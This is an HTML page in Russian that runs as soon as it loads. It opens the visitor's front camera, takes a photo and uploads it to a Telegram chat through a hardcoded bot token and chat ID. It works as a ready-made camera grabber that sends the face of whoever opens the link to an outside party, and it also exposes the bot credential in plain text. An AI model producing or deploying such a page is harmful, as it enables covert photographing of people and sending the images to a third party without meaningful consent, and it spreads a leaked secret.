<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Камера</title>
    <style>
        html, body {
            margin: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: sans-serif;
            flex-direction: column;
            gap: 16px;
        }
        img { max-width: 90%; border-radius: 12px; }
        p { color: #555; font-size: 18px; text-align: center; padding: 0 20px; }
    </style>
</head>
<body>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<p id="status">Запускаю камеру...</p>
<img id="photo" style="display:none;">

<script>
    const BOT_TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
    const CHAT_ID = "1314241513";

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const photo = document.getElementById("photo");
    const status = document.getElementById("status");

    async function sendToTelegram(blob) {
        status.textContent = "Отправляю в Telegram...";
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
            const data = await res.json();
            status.textContent = data.ok ? "Отправлено!" : "Ошибка Telegram: " + JSON.stringify(data);
        } catch (e) {
            status.textContent = "Ошибка отправки: " + e.message;
        }
    }

    async function takePhoto() {
        status.textContent = "Запрашиваю камеру...";
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            status.textContent = "Камера открыта, делаю фото...";
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            stream.getTracks().forEach(t => t.stop());
            canvas.toBlob(async (blob) => {
                photo.src = URL.createObjectURL(blob);
                photo.style.display = "block";
                await sendToTelegram(blob);
            }, "image/png");
        } catch (e) {
            status.textContent = "Ошибка камеры: " + e.name + " — " + e.message;
        }
    }

    window.addEventListener("load", takePhoto);
</script>

</body>
</html>
